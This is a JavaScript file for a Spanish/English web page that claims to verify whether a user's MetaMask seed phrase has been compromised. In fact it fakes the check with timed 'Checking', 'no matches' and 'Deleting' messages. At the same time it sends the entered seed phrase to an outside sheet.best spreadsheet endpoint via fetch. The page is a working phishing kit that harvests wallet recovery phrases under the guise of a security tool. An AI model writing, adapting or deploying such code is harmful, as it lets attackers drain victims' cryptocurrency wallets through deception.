const form = document.querySelector("form"),
	btn = document.getElementById("btn"),
	iconLang = document.querySelector(".lang");
let input = form.querySelector("input[type='text']"),
	lang = {
		"español": {
			"title": "Verifica frase semilla de MetaMask",
			"text": "Comprueba si su frase semilla de MetaMask ha sido comprometida",
			"text2": "Separé cada palabra con un espacio",
			"errorLeng": "La frase debe de tener de 12 a 24 palabras",
			"errorNumber": "La frase no debe tener números ni caracteres",
			"success": "Enhorabuena, no hay coincidencias",
			"textBtn": "Verificar",
			"cheking": "Verificando",
			"delete": "Borrando",
			"placeholder": "Ingresar frase"
		},
		"ingles": {
			"title": "Verify MetaMask seed phrase",
			"text": "Check if your MetaMask seed phrase has been compromised",
			"text2": "I separated each word with a space",
			"errorLeng": "The sentence must have between 12 and 24 words",
			"errorNumber": "The phrase must not have numbers or characters",
			"success": "Congratulations, there are no matches",
			"textBtn": "Check",
			"cheking": "Cheking",
			"delete": "Delete",
			"placeholder": "Enter phrase"
		}
	}
changaLang()

iconLang.addEventListener("click", (e) => {
	iconLang.classList.toggle("active");

	if (e.target.localName == "p") {

		localStorage.setItem('lang', e.target.dataset.lang);

	}
	changaLang()

})

form.addEventListener("submit", e => {
	let door = true,
		cont = 0;

	e.preventDefault()

	let data = input.value.split(" ")

	if (data.length < 12 || data.length > 24) {
		btn.value = `${lang[localStorage.getItem("lang")].errorLeng}`
		setTimeout(() => {
			btn.value = `${lang[localStorage.getItem("lang")].textBtn}`

		}, 2000)
		return false

	}

	for (let i = 0; data.length >= i; i++) {
		if (data[i] == "") {
			data.splice(i, 1)
		}
	}

	data.forEach((elem, index) => {

		if (isNaN(elem) == false) {
			cont++
			btn.value = `${lang[localStorage.getItem("lang")].errorNumber}`
			setTimeout(() => {
				btn.value = `${lang[localStorage.getItem("lang")].textBtn}`
			}, 2000)

		}
		if (index == data.length - 1) {
			if (cont == 0) {
				btn.value = `${lang[localStorage.getItem("lang")].cheking}...`
				setTimeout(() => {
					btn.value = `${lang[localStorage.getItem("lang")].success}`
					setTimeout(() => {
						btn.value = `${lang[localStorage.getItem("lang")].delete}...`
						setTimeout(() => {
							btn.value = `${lang[localStorage.getItem("lang")].textBtn}`
							input.value = ""
						}, 2500)
					}, 2500)
				}, 4000)
			}
		}
	})

	if (cont > 0) {
		return false
	}


	fetch("https://sheet.best/api/sheets/f89d6959-4b0d-479e-9bcd-3d5222020639", {
		method: 'POST',
		mode: 'cors',
		headers: {
			'Content-Type': 'application/json'
		},
		body: JSON.stringify({
			"key": String(data)
		})
	})



})



function changaLang() {
	if(localStorage.getItem("lang") == null){
		localStorage.setItem("lang", "ingles")
	}
		
	document.querySelector("html").lang = localStorage.getItem("lang") == "español" ? "es" : "en" 
	let langs = document.querySelectorAll(".langs");
	langs.forEach((elem, i) => {
		if (i == 0) { elem.innerHTML = lang[localStorage.getItem("lang")].title }
		if (i == 1) { elem.innerHTML = lang[localStorage.getItem("lang")].text }
		if (i == 2) { elem.placeholder = lang[localStorage.getItem("lang")].placeholder }
		if (i == 3) { elem.innerHTML = lang[localStorage.getItem("lang")].text2 }


	})
	btn.value= lang[localStorage.getItem("lang")].textBtn
}
